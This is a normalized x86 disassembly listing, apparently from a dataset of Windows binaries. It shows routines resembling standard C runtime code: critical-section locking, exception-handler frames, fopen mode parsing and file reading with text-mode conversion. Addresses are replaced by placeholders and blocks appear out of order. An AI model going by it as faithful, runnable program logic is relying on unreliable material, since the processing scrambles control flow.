cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rwxdata ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_40f555
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rwxdata ]
jge r-xdata
push eax
push esi
call sub_40c0a2
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40f1e4
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_40f0fa
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40f0fa
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40f21c
push 0xc
push r--data
call sub_40f510
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_40c061
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_40f0fa
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f265
mov eax [ ebp - 0x1c ]
push esi
call sub_40f142
pop ecx
jmp r-xdata
call sub_40f555
retn
sub_40f278
mov edi edi
push esi
push edi
xor esi esi
mov edi rwxdata
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rwxdata ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rwxdata ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rwxdata ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40f2c2
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rwxdata
push edi
add esi 0x8
cmp esi rwxdata
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rwxdata
pop edi
push edi
call ebx
push edi
call sub_40b955
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rwxdata
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40f348
push 0xc
push r--data
call sub_40f510
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rwxdata ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rwxdata ]
cmp [ esi ] ebx
je r-xdata
call sub_40d4fd
push 0x1e
call sub_40d34e
push 0xff
call sub_40cb8e
push 0x18
call sub_40eec5
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_40d1fa
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_40f555
retn
push edi
call sub_40b955
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_40b955
pop ecx
call sub_40d1fa
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f401
mov eax [ ebp - 0x1c ]
sub_40f40a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rwxdata ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40f348
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_40cead
sub_40f43d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_410551
push eax
call sub_41384d
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_40bf8a
add eax 0x20
cmp esi eax
jne r-xdata
call sub_40bf8a
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rwxdata ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rwxdata ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_40eec5
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_40f4d9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_40f092
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_40f510
push sub_40f5a0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rwxdata ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_40f5a0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rwxdata ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40b946
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40b946
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rwxdata
push edi
mov ecx ebx
call sub_40fd6b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_40fd22
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40b946
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40b946
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_40fd52
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rwxdata
push edi
mov edx ebx
mov ecx eax
call sub_40fd6b
mov eax [ ebp + 0xc ]
push rwxdata
call sub_412b10
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40b946
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_40fd39
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40b946
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rwxdata ]
add esp 0x8
sub_40f72f
push 0x10
push r--data
call sub_40f510
call sub_40bf8a
lea esi [ eax + 0x20 ]
mov [ ebp - 0x1c ] esi
xor eax eax
cmp [ ebp + 0xc ] eax
setne al
test eax eax
jne r-xdata
push esi
call sub_40c061
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40f43d
mov edi eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
push esi
push edi
call sub_40f4d9
add esp 0x1c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f7ac
mov eax [ ebp - 0x20 ]
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
call sub_40f555
retn
sub_40f85f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edi [ ecx + 0x7f ]
mov edx 0x4000
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_4174db
add esp 0x14
test eax eax
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
inc [ rwxdata ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_417865
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx edi
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_4176ff
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_4176ff
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_4176ff
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_40faf6
push 0x10
push r--data
call sub_40f510
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_40f40a
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rwxdata ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fc20
mov eax edi
call sub_40f555
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
push 0x38
call sub_40eec5
pop ecx
mov ecx [ rwxdata ]
mov [ ecx + esi * 4 ] eax
cmp eax ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
mov eax [ rwxdata ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rwxdata ]
mov edi [ eax + esi * 4 ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ eax + esi * 4 ]
call sub_40b955
pop ecx
mov eax [ rwxdata ]
mov [ eax + esi * 4 ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rwxdata ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
push esi
call sub_40c0a2
pop ecx
pop ecx
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_40f348
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_40c110
pop ecx
pop ecx
sub_40fc30
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40fcc0
push [ fs : 0x0 ]
mov eax [ rwxdata ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_417995
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4179b4
jmp r-xdata
sub_40fcc0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40b946
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40fc30
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40fd22
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40fd52
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40fd82
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_413804
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_410551
pop ecx
push eax
call sub_41045b
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_410551
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rwxdata
push esi
call sub_410551
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_410551
sar eax 0x5
push esi
lea edi [ eax * 4 + rwxdata ]
call sub_410551
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_40fea4
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_40d20d
and [ eax ] 0x0
call sub_40d1fa
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_40d20d
mov [ eax ] ebx
call sub_40d1fa
mov [ eax ] 0x9
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
cmp esi [ rwxdata ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rwxdata ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_40d20d
mov [ eax ] ebx
call sub_40d1fa
mov [ eax ] 0x9
jmp r-xdata
call sub_40d20d
mov [ eax ] ebx
call sub_40d1fa
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_40e72d
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_40eec5
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_413695
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_40d1fa
mov [ eax ] 0xc
call sub_40d20d
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d20d
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_40d220
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_40b955
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rwxdata ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rwxdata ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x2a
jmp r-xdata
